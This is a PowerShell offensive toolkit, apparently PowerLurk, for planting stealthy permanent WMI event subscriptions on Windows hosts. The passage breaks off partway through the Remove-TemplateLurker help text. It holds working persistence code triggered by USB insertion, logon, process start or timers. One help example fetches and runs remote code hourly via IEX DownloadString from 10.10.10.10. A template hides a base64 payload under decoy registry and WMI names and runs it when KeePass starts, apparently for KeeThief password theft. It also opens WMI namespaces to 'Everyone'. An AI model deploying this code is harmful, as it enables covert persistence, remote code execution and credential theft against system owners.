function Get-WmiEvent {

<#
.SYNOPSIS

By default, Get-WmiEvent queries WMI for all __FilterToConsumerBinding instances and associated __EventFilter, and __EventConsumer instances. 

.DESCRIPTION

This function will query and return all instances of the __FilterToConsumerBinding class and their associated __EventFilter and 
__EventConsumer objects. Parameters are present to return any combination of these instances. It is also possible to filter by name using the -Name parameter.

.PARAMETER Binding

Indicates that WMI _FilterToConsumerBinding instances be returned. 

.PARAMETER Consumer

Indicates that WMI event consumers are returned. 

.PARAMETER Filter

Indicates that WMI event filters are returned. 

.PARAMETER Name

Specifies the WMI event instance name to return. 

.PARAMETER ComputerName

Specifies the remote computer system to add a permanent WMI event to. The default is the local computer.

Type the NetBIOS name, an IP address, or a fully qualified domain name (FQDN) of one or more computers. To specify the local computer, type the computer name, a dot (.), or localhost.

.PARAMETER Credential

The credential object used to authenticate to the remote system. If not specified, the current user instance will be used.

.EXAMPLE

PS C:\>Get-WMIEvent -Name TestEvent

This command will return all WMI event objects named 'TestEvent'.

.EXAMPLE

PS C:\>Get-WMIEvent -Consumer -Filter

This command will return all WMI event consumers and filters.

.EXAMPLE

PS C:\>Get-WMIEvent -Name TestEvent | Remove-WMIEvent

This command will return all WMI event objects with the name TestEvent.

.OUTPUTS

System.Management.ManagementBaseObject.ManagementObject

This cmdlet returns System.Management.ManagementBaseObject.ManagementObject objects.

#>

    Param (

        [Switch]
        $Binding,

        [String]
        $ComputerName,

        [Switch]
        $Consumer,

        [Management.Automation.PSCredential]
        $Credential,

        [Switch]
        $Filter,

        [String]
        $Name

    )
    $Arguments = @{}
    if ($ComputerName){
        $Arguments['ComputerName'] = $ComputerName
        if ($Credential){
            $Arguments['Credential'] = $Credential
        }
    }
    if ($Name){
        $Arguments['Filter'] = "__RELPATH LIKE `"%$Name%`""
    }
    if (!$Binding -and !$Consumer -and !$Filter){
        $Events = Get-WmiObject '__FilterToConsumerBinding' -Namespace root/subscription @Arguments
        if ($Events){
            foreach($Event in $Events){
                $Event
                $ConsumerId = $Event.Consumer
                $FilterId = $Event.Filter
                $Arguments['Filter'] = "__RELPATH='$ConsumerId'"
                Get-WmiObject -Namespace root/subscription -Class $($ConsumerId.Split('.')[0]) @Arguments
                $Arguments['Filter'] = "__RELPATH='$FilterId'"
                Get-WmiObject -Namespace root/subscription -Class $($FilterId.Split('.')[0]) @Arguments
            }
        }
    }
    if($Binding){
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace root/subscription @Arguments
    }
    if($Consumer){
        Get-WmiObject -Class __EventConsumer -Namespace root/subscription @Arguments
    }
    if($Filter){
        Get-WmiObject -Class __EventFilter -Namespace root/subscription @Arguments
    }
}

function Register-MaliciousWMIEvent {

<#
.SYNOPSIS

Registers a malicious WMI Event using predefinied triggers and a user provided action.

.DESCRIPTION

This cmdlet is the core of PowerLurk. It takes a command, script, or scriptblock as the action, and a precanned trigger, then creates the WMI Filter, 
Consumer, and FilterToConsumerBinding required for a fully functional Permanent WMI Event Subscription. A number of WMI event triggers, or filters, 
are preconfigured. The trigger must be specified with the -Trigger parameter. There are three consumers to choose from, PermanentCommand, 
PermanentScript, and LocalScriptBLock.

.PARAMETER PermanentCommand

Indicates that an operating system command will be executed once the specified WMI event occurs. Provide a string or scriptblock
containing the command you would like to run. 

.PARAMETER PermanentScript

Indicates that a provided Jscript or VBScript will run once a WMI event occurs. Provide a string or scriptblock containing 
the script code you would like executed.

.PARAMETER LocalScriptBlock

Indicates that a provided local event scriptblock be executed once a WMI event occurs.

.PARAMETER Trigger

Specifies the event trigger (WMI Filter) to use. The options are InsertUSB, UserLogon, ProcessStart, Interval, and Timed. UserLogon is an extrinisic
event, so the event object is used with %TargetInstance.PropertyName% rather than %PropertyName% like the other instrinsic options.

.PARAMETER EventName

Specifies an arbitrary name to be assigned to the new permanent WMI event.

.PARAMETER UserName

Specifies the username that the UserLogon trigger will generate a WMI event. Use 'any' or '*' for any user logon.

.PARAMETER ProcessName

Specifies the process name when the ProcessStart trigger is selected (required).

.PARAMETER IntervalPeriod

Specifies the interval period, in seconds, when the Interval trigger is selected (required).

.PARAMETER ExecutionTime

Specifies the absolute time to generate a WMI event when the Timed trigger is selected (required).

.PARAMETER ComputerName

Specifies the remote computer system to add a permanent WMI event to. The default is the local computer.

Type the NetBIOS name, an IP address, or a fully qualified domain name (FQDN) of one or more computers. To specify the local computer, type the computer name, a dot (.), or localhost.

.PARAMETER Credential

The credential object used to authenticate to the remote system. If not specified, the current user instance will be used.

.EXAMPLE

PS C:\>Register-MaliciousWmiEvent -EventName KillProc -PermanentCommand "Powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName powershell.exe


This command creates a permanent WMI event that will kill the 'powershell.exe' process after it is started.

.EXAMPLE

$script = @’
Set objFSO=CreateObject("Scripting.FileSystemObject")
outFile="c:\temp\log.txt"
Set objFile = objFSO.CreateTextFile(outFile,True)
objFile.Write "%TargetInstance.ProcessName% started at PID %TargetInstance.ProcessId%" & vbCrLf
objFile.Close
‘@

PS C:\>Register-MaliciousWmiEvent -EventName KillProc -PermanentScript $script -Trigger ProcessStart -ProcessName powershell.exe


This command creates a permanent WMI event will execute a log the process name and ID to a log file using VBScript anytime powershell.exe starts.

.EXAMPLE

PS C:\>Register-MaliciousWmiEvent -EventName DLThumbdrive -PermanentScript $script -Trigger InsertUSB


This command creates a permanent WMI event will execute a script when a new volume is added to the target system, such as a USB storage device or mapped network drive.

.EXAMPLE

PS C:\>Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand "cmd.exe /c echo %TargetInstance.Antecedent% >> c:\temp\log.txt" -Trigger UserLogon -Username any


This command creates a permanent WMI event save the Antecedent property of the target event instance, which contains the username and domain, to a log file anytime a user logs in.

.EXAMPLE

PS C:\>Register-MaliciousWmiEvent -EventName CheckIn -PermanentCommand "powershell.exe -NoP -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/checkin.html')" -Trigger Interval -IntervalPeriod 3600


This command creates a permanent WMI event that will perform Invoke-Expression on whatever is returned after a GET request to 'http://10.10.10.10/checkin.html' every 60 minutes.

.EXAMPLE

PS C:\>Register-MaliciousWmiEvent -EventName ExecuteSystemCheck -PermanentScript $script -Trigger Timed -ExecutionTime '07/07/2016 12:30pm'


This command creates a permanent WMI event execute a specified script at '07/07/2016 12:30pm'

.OUTPUTS

System.Management.ManagementBaseObject.ManagementObject

By default, this cmdlet returns a System.Management.ManagementBaseObject.ManagementObject.

#>

    Param (
        
        [String]
        $ComputerName,

        [Management.Automation.PSCredential]
        $Credential,

        [Parameter(ParameterSetName = 'LocalUserLogonSet')]
        [Parameter(ParameterSetName = 'CommandUserLogonSet')]
        [Parameter(ParameterSetName = 'ScriptUserLogonSet')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Domain,

        [Parameter(Mandatory = $True, ParameterSetName = 'CommandInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandProcessStartSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalProcessStartSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]
        [String]
        [ValidateNotNullOrEmpty()]
        $EventName,
        
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]
        [Datetime]
        [ValidateNotNullOrEmpty()]
        $ExecutionTime,

        [Parameter(Mandatory = $True, ParameterSetName = 'CommandIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]
        [Int32]
        [ValidateNotNullOrEmpty()]
        $IntervalPeriod,

        [Parameter(Mandatory = $True, ParameterSetName = 'LocalInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalProcessStartSet')]
        [ScriptBlock]
        [ValidateNotNullOrEmpty()]
        $LocalScriptBlock,

        [Parameter(ParameterSetName = 'CommandUserLogonSet')]
        [Parameter(ParameterSetName = 'LocalUserLogonSet')]
        [Parameter(ParameterSetName = 'ScriptUserLogonSet')]
        [ValidateSet('Interactive', 'Network')]
        [String]
        [ValidateNotNullOrEmpty()]
        $LogonType,

        [Parameter(Mandatory = $True, ParameterSetName = 'CommandProcessStartSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalProcessStartSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ProcessName,

        [Parameter(Mandatory = $True, ParameterSetName = 'CommandInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandProcessStartSet')]
        [String]
        [ValidateNotNullOrEmpty()]
        $PermanentCommand,

        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]
        [String]
        [ValidateNotNullOrEmpty()]
        $PermanentScript,

        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]
        [ValidateSet('VBScript', 'JScript')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ScriptingEngine,

        [Parameter(ParameterSetName = 'CommandTimedSet')]
        [Parameter(ParameterSetName = 'CommandIntervalSet')]
        [Parameter(ParameterSetName = 'LocalTimedSet')]
        [Parameter(ParameterSetName = 'LocalIntervalSet')]
        [Parameter(ParameterSetName = 'ScriptTimedSet')]
        [Parameter(ParameterSetName = 'ScriptIntervalSet')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TimerId = 'WindowsTimer',

        [Parameter(Mandatory = $True, ParameterSetName = 'LocalInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'LocalProcessStartSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandProcessStartSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptInsertUSBSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptTimedSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptIntervalSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptProcessStartSet')]
        [ValidateSet('InsertUSB', 'UserLogon', 'ProcessStart', 'Interval', 'Timed')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Trigger,

        [Parameter(Mandatory = $True, ParameterSetName = 'LocalUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'CommandUserLogonSet')]
        [Parameter(Mandatory = $True, ParameterSetName = 'ScriptUserLogonSet')]
        [String]
        [ValidateNotNullOrEmpty()]
        $UserName

    )

    #Build optional argument splat if a remote system is specified
    $Arguments = @{}

    if ($ComputerName){
        $Arguments['ComputerName'] = $ComputerName
        if ($Credential){
            $Arguments['Credential'] = $Credential
        }
    }
    
    Switch ($Trigger){
        'InsertUSB' {$Query = 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2'}
        'UserLogon' {
            if ($UserName -eq 'any' -or $UserName -eq '*'){
                $Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
            }else{
                $Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser' AND TargetInstance.__RELPATH like `"%$Domain%$UserName%`""             
            }
        }
        'Interval' {
            Set-WmiInstance -class '__IntervalTimerInstruction' -Arguments @{ IntervalBetweenEvents = ($IntervalPeriod * 1000); TimerId = $TimerId } | Out-Null
            $Query = "Select * from __TimerEvent where TimerId = '$TimerId'"
        }
        'Timed' {
            Set-WmiInstance -class '__AbsoluteTimerInstruction' -Arguments @{ EventDatetime = [System.Management.ManagementDateTimeConverter]::ToDmtfDateTime($ExecutionTime); TimerId = $TimerId } | Out-Null
            $Query = "Select * from __TimerEvent where TimerId = '$TimerId'"
        }
        'ProcessStart' {
            $Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='$ProcessName'"
        }
        #'LockedScreen' {$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'LogonUI.exe'"}
    }

    # Consumer Setup, query, and variable assignment
    switch -Wildcard ($PsCmdlet.ParameterSetName) {

        # Build Command Line Consumer object if -Command is used
        'Command*' {
            $CommandConsumerArgs = @{
                Name = $EventName
                CommandLineTemplate = $PermanentCommand
            }
            $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandConsumerArgs @Arguments
            
            # Filter Setup, query, and variable assignment
            $EventFilterArgs = @{
                EventNamespace = 'root/cimv2'
                Name = $EventName
                Query = $Query
                QueryLanguage = 'WQL'
            }

            $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs @Arguments

            $FilterToConsumerArgs = @{
                Filter = $Filter
                Consumer = $Consumer
            }

            # Filter to Consumer Binding 
            Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs @Arguments | Out-Null
        }
        # Build Active Script Consumer object if -Script is used
        'Script*' {
            $ScriptConsumerArgs = @{
                Name = $EventName
                ScriptText = $PermanentScript
                ScriptingEngine = $ScriptingEngine
            }
            $Consumer = Set-WmiInstance -Namespace root/subscription -Class ActiveScriptEventConsumer -Arguments $ScriptConsumerArgs @Arguments
            
            # Filter Setup, query, and variable assignment
            $EventFilterArgs = @{
                EventNamespace = 'root/cimv2'
                Name = $EventName
                Query = $Query
                QueryLanguage = 'WQL'
            }

            $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs @Arguments

            $FilterToConsumerArgs = @{
                Filter = $Filter
                Consumer = $Consumer
            }

            # Filter to Consumer Binding 
            Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs @Arguments | Out-Null
        }
        # Build Local WMI Event
        'Local*'{
            $Arguments = @{
                Query = $Query
                Action = $LocalScriptBlock
                SourceIdentifier = $EventName
            }
            Register-WmiEvent @Arguments
        }
    }
}

function Grant-WmiNameSpaceRead {
<#
    .SYNOPSIS
    
        Grants remote read access to 'Everyone' for a given WMI namespace.
        Access can be revoked with Revoke-WmiNameSpaceRead.
        Heavily adapted from Steve Lee's example code on MSDN, originally licenses. 
        Taken from @enigma0x3's PowerSCCM (https://github.com/PowerShellMafia/PowerSCCM/blob/master/PowerSCCM.ps1).
   
    .PARAMETER Namespace
        Namespace to allow a read permission form.   
    .PARAMETER ComputerName
        The computer to grant read access to the specified namespace on.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object to use for the remote connection.
    .EXAMPLE
        PS C:\> Grant-WmiNameSpaceRead -NameSpace 'root\Microsoft\Windows'
    .EXAMPLE
        PS C:\> $Cred = Get-Credential
        PS C:\> Grant-WmiNameSpaceRead -NameSpace 'root\Microsoft\Windows' -ComputerName sccm.testlab -Credential $Cred
    .LINK
        http://blogs.msdn.com/b/wmi/archive/2009/07/27/scripting-wmi-namespace-security-part-3-of-3.aspx
        http://vniklas.djungeln.se/2012/08/22/set-up-non-admin-account-to-access-wmi-and-performance-data-remotely-with-powershell/
#>
    [CmdletBinding()]
    param(
        [String]
        [ValidateNotNullOrEmpty()]
        $NameSpace = 'root\Microsoft\Windows',

        [String]
        [ValidateNotNullOrEmpty()]
        $ComputerName = ".",

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )    

    # needed for non-DCs - add 'Everyone' to the 'Distributed COM Users' localgroup
    $Group = [ADSI]("WinNT://$ComputerName/Distributed COM Users,group")

    if ($PSBoundParameters.ContainsKey("Credential")) {
        $Params = @{Namespace=$Namespace; Path="__systemsecurity=@"; ComputerName=$ComputerName; Credential=$Credential}

        # alternate credentials for the adsi WinNT service provider
        $Group.PsBase.Username = $Credential.Username
        $Group.PsBase.Password = $Credential.GetNetworkCredential().Password
    }
    else {
        $Params = @{Namespace=$Namespace; Path="__systemsecurity=@"; ComputerName=$ComputerName}
    }

    try {
        # actually add 'Everyone' to 'Distributed COM Users'
        $Group.Add("WinNT://everyone,user")
    }
    catch {
        Write-Warning $_
    }

    $WmiObjectAcl = $(Invoke-WmiMethod -Name GetSecurityDescriptor @Params).Descriptor

    # 33 = enable + remote access
    $WmiAce = (New-Object System.Management.ManagementClass("win32_Ace")).CreateInstance()
    $WmiAce.AccessMask = 33
    $WmiAce.AceFlags = 0

    $WmiTrustee = (New-Object System.Management.ManagementClass("win32_Trustee")).CreateInstance()
    
    # sid of "S-1-1-0" = "Everyone"
    $WmiTrustee.SidString = "S-1-1-0"
    $WmiAce.Trustee = $WmiTrustee
    $WmiAce.AceType = 0x0
    $WmiObjectacl.DACL += $WmiAce.PSObject.ImmediateBaseObject

    $Params += @{Name="SetSecurityDescriptor"; ArgumentList=$WmiObjectAcl.PSObject.ImmediateBaseObject}
    $Output = Invoke-WmiMethod @Params
    if ($Output.ReturnValue -ne 0) {
        throw "SetSecurityDescriptor failed: $($Output.ReturnValue)"
    }
}

function Revoke-WmiNameSpaceRead {
<#
    .SYNOPSIS
    
        Removes remote read access from 'Everyone' for a given WMI namespace that
        was granted by Grant-WmiNameSpaceRead.
        Heavily adapted from Steve Lee's example code on MSDN, originally licenses.
        Taken from @enigma0x3's PowerSCCM (https://github.com/PowerShellMafia/PowerSCCM/blob/master/PowerSCCM.ps1).
   
    .PARAMETER Namespace
        Namespace to allow a read permission form.   
    .PARAMETER ComputerName
        The computer to revoke read access to the specified namespace on.
    .PARAMETER Credential
        A [Management.Automation.PSCredential] object to use for the remote connection.
    .EXAMPLE
        PS C:\> Revoke-WmiNameSpaceRead -NameSpace 'root\Microsoft\Windows'
    .EXAMPLE
        PS C:\> $Cred = Get-Credential
        PS C:\> Revoke-WmiNameSpaceRead -NameSpace 'root\Microsoft\Windows' -ComputerName sccm.testlab -Credential $Cred
    .LINK
        http://blogs.msdn.com/b/wmi/archive/2009/07/27/scripting-wmi-namespace-security-part-3-of-3.aspx
        http://vniklas.djungeln.se/2012/08/22/set-up-non-admin-account-to-access-wmi-and-performance-data-remotely-with-powershell/
#>
    [CmdletBinding()]
    param(
        [String]
        [ValidateNotNullOrEmpty()]
        $NameSpace = 'root\Microsoft\Windows',

        [String]
        [ValidateNotNullOrEmpty()]
        $ComputerName = ".",

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )    

    $Group = [ADSI]("WinNT://$ComputerName/Distributed COM Users,group")

    if ($PSBoundParameters.ContainsKey("Credential")) {
        $Params = @{Namespace=$Namespace; Path="__systemsecurity=@"; ComputerName=$ComputerName; Credential=$Credential}
        $Group.PsBase.Username = $Credential.Username
        $Group.PsBase.Password = $Credential.GetNetworkCredential().Password
    }
    else {
        $Params = @{Namespace=$Namespace; Path="__systemsecurity=@"; ComputerName=$ComputerName}
    }

    # remove 'Everyone' from the 'Distributed COM Users' local group on the remote server
    $Group.Remove("WinNT://everyone,user")

    $WmiObjectAcl = $(Invoke-WmiMethod -Name GetSecurityDescriptor @Params).Descriptor

    # remove the 'Everyone' ('S-1-1-0') DACL
    $WmiObjectAcl.DACL = $WmiObjectAcl.DACL | Where-Object {$_.Trustee.SidString -ne 'S-1-1-0'} | ForEach-Object { $_.psobject.immediateBaseObject }

    $Params += @{Name="SetSecurityDescriptor"; ArgumentList=$WmiObjectAcl.PSObject.ImmediateBaseObject}
    $Output = Invoke-WmiMethod @Params
    if ($Output.ReturnValue -ne 0) {
        throw "SetSecurityDescriptor failed: $($Output.ReturnValue)"
    }
}

function Add-TemplateLurker{

<#
.SYNOPSIS

Adds a permanent WMI event that utilizes either registry values or a custom WMI namespace and class to store encoded Powershell logic and its output.

.DESCRIPTION

Add-TemplateLurker creates a permanent WMI event that will execute a provided payload when

the '<processname>' process starts. The payload, base64 Powershell logic, and its output are either stored in a custom WMI namespace and class or regsitry values. If a custom 
WMI namespace and class are selected, you have the option to expose that namespace so that it can be read remotely 
by 'Everyone'. Registry path and value names are customizable using the associated Parameters; however, this is optional as
defaults are set.

.PARAMETER WMI

Indicates that a custom WMI class will be used for data storage. 

.PARAMETER Registry

Indicates that athe registry will be used for data storage. 

.PARAMETER ClassName

Indicates the name of the custom WMI class. Defaults to 'WindowsUpdate'.

.PARAMETER ExposeNamespace

Indicates that the custom WMI namespace will be exposed so that 'Everyone' can read the custom WMI class properties remotely. 

.PARAMETER NamespaceName

Indicates the name of the custome WMI namespace. Defaults to 'ROOT\Software'.

.PARAMETER PayloadValueName

Indicates the name of the registry value used to store KeeThief logic. Defaults to 'DomainCertificate'.

.PARAMETER OutputValueName

Indicates the name of the registry value used to store KeeThief output. Defaults to 'ComputerCertificate'.

.PARAMETER RegistryPath

Indicates the name of the custome WMI class. Defaults to 'HKLM:\SOFTWARE\Microsoft\SystemCertificates\'.

.PARAMETER EventName

Specifies the name to use for the WMI event. 

.EXAMPLE

PS C:\>Add-TemplateLurker -EventName Lurker -WMI

This command will create a WMI event that uses a custom WMI class for storage.

.EXAMPLE

PS C:\>Add-TemplateLurker -EventName Lurker -Registry

This command will create a WMI event that uses the registry for storage.

.EXAMPLE

PS C:\>Add-TemplateLurker -EventName Lurker -WMI -NamespaceName root\cimv2\KeeThief -ExposeNamespace

This command will create a WMI event that uses a custom WMI class for storage at 'root\cimv2\KeeThief'. The data stored in this namespace
will be readable remotely by 'Everyone'
#>

    Param (

        [Parameter(ParameterSetName = 'WMI')]
        [String]
        $ClassName = 'WindowsUpdate',

        [Parameter(Mandatory = $True, ParameterSetName = 'Registry')]
        [Parameter(Mandatory = $True, ParameterSetName = 'WMI')]
        [String]
        $EventName,

        [Parameter(ParameterSetName = 'WMI')]
        [Switch]
        $ExposeNamespace,

        [Parameter(ParameterSetName = 'WMI')]
        [String]
        $NamespaceName = 'root\Software',

        [Parameter(ParameterSetName = 'Registry')]
        [String]
        $OutputValueName = 'ComputerCertificate',
        
        [Parameter(Mandatory = $True,ParameterSetName = 'Registry')]
        [Switch]
        $Registry,
        
        [Parameter(ParameterSetName = 'Registry')]
        [String]
        $RegistryPath = "HKLM:\SOFTWARE\Microsoft\SystemCertificates\",

        [Parameter(ParameterSetName = 'Registry')]
        [String]
        $PayloadValueName = 'DomainCertificate',

        [Parameter(Mandatory = $True, ParameterSetName = 'WMI')]
        [Switch]
        $WMI
        
    )

    # Base64 encoded KeeThief functions
    $Payload = "<INSERT VALUE>"

    switch($PsCmdlet.ParameterSetName){
        'WMI'{
            
            # Create custome WMI namespace
            $NSArray = $NamespaceName.Split('\')
            $Namespace = [wmiclass]"$($NSArray[0..($NSArray.Length - 2)] -join '\'):__namespace"
            $CustomNamespace = $Namespace.CreateInstance()
            $CustomNamespace.Name = $NSArray[-1]
            [void]$CustomNamespace.Put()

            Write-Verbose "Namespace $NamespaceName Created"

            # Expose namespace to 'Everyone' remotely
            if($ExposeNamespace){
                Grant-WmiNameSpaceRead -NameSpace $NamespaceName
            }

            # Create custom WMI class
            $CustomClass = New-Object Management.ManagementClass("$NamespaceName", $null, $null)
            $CustomClass.Name = "Win32_$ClassName"
            $CustomClass.Properties.Add('Content', $Payload)
            $CustomClass.Put() | Out-Null

            Write-Verbose "Custom WMI Class Win32_$ClassName Created"

            # Logic that is executed after the event is triggered.
            $ConsumerLogic= 
                "`$CustomClass = Get-WmiObject -Namespace $NamespaceName -class Win32_$ClassName -List;
                `$Payload = `$CustomClass.Properties['Content'].Value;
                `$Output = Invoke-Expression -Command `$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$Payload)));
                `$OutputString = `$Output | Out-String;
                `$EncodedOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$OutputString));
                `$CustomClass.Properties.Add('Output', `$EncodedOutput);
                `$CustomClass.Put() | Out-Null"

            # Registering WMI event
            Register-MaliciousWmiEvent -EventName $EventName -PermanentCommand $ConsumerLogic -Trigger ProcessStart -ProcessName keepass.exe | Out-Null
            Write-Verbose "WMI KeeTheifLurker '$EventName' Created."

            # Cleanup command construction
            $CleanupParameters = [System.Collections.ArrayList]@()
            if($NamespaceName -ne 'Software'){
                [void]$CleanupParameters.Add('-NamespaceName') 
                [void]$CleanupParameters.Add($NamespaceName)
            }
            if($ClassName -ne 'WindowsUpdate'){
                [void]$CleanupParameters.Add('-ClassName')
                [void]$CleanupParameters.Add($ClassName)
            }
            Write-Verbose "Cleanup Command: "
            Write-Verbose "Remove-TemplateLurker -EventName $EventName -WMI $($CleanupParameters)"
        }
       'Registry'{
        
            # Checking if provided registry path exists. It is created if it doesn't
            if (!$RegistryPath){New-Item -Path $RegistryPath -Force | Out-Null}

            # Create value that will hold KeeThief logic
            New-ItemProperty -Path $RegistryPath -Name $PayloadValueName -Value $Payload -PropertyType MultiString -Force | Out-Null
            Write-Verbose "Registry Value $RegistryValueName Created At $RegistryPath"

            # Logic that is executed after the event is triggered
            $ConsumerLogic=
                "`$RegistryPath = '$RegistryPath';
                `$Payload = `$(Get-ItemProperty -Path `$RegistryPath -Name $PayloadValueName).$PayloadValueName;
                `$Output = Invoke-Expression -Command `$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$Payload)));
                `$OutputString = `$Output | Out-String;
                `$EncodedOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$OutputString));
                New-ItemProperty -Path `$RegistryPath -Name $OutputValueName -Value `$EncodedOutput -PropertyType MultiString -Force | Out-Null"

            # Registering WMI event
            Register-MaliciousWmiEvent -EventName $EventName -PermanentCommand $ConsumerLogic -Trigger ProcessStart -ProcessName keepass.exe | Out-Null
            Write-Verbose "Registry KeeTheifLurker '$EventName' Created"
            
            # Cleanup command construction
            $CleanupParameters = [System.Collections.ArrayList]@()
            if($PayloadValueName -ne 'DomainCertificate'){
                [void]$CleanupParameters.Add('-PayloadValueName') 
                [void]$CleanupParameters.Add($PayloadValueName)
            }
            if($OutputValueName -ne 'ComputerCertificate'){
                [void]$CleanupParameters.Add('-OutputValueName')
                [void]$CleanupParameters.Add($OutputValueName)
            }
            if($RegistryPath -ne 'HKLM:\SOFTWARE\Microsoft\SystemCertificates\'){
                [void]$CleanupParameters.Add('-RegistryPath')
                [void]$CleanupParameters.Add($RegistryPath)
            }
            Write-Verbose "Cleanup Command: "
            Write-Verbose "Remove-TemplateLurker -EventName $EventName -Registry $($CleanupParameters)"
        }
    }
    
    
}

function Remove-TemplateLurker{

<#
.SYNOPSIS

Removes formerly added TemplateLurker.

.DESCRIPTION

Remove-TemplateLurker deletes the permanent WMI event and associated filter and consumer. It also removes registry or 
WMI storage components. In order to do this, the same arguments must be pass to this cmdlet as they were when creating
the TemplateLurker.

.PARAMETER WMI

Indicates that a custom WMI class was used for data storage. 

.PARAMETER Registry

Indicates that the registry was used for data storage. 

.PARAMETER ClassName

Indicates the a non-default WMI class name was specified.

.PARAMETER ExposeNamespace

Indicates the WMI namespace was exposed.

.PARAMETER NamespaceName

Indicates the a non-default WMI namespace name was specified.

.PARAMETER PayloadValueName

Indicates the a non-default registry payload value name was specified.

.PARAMETER OutputValueName

Indicates the a non-default registry output value name was specified.

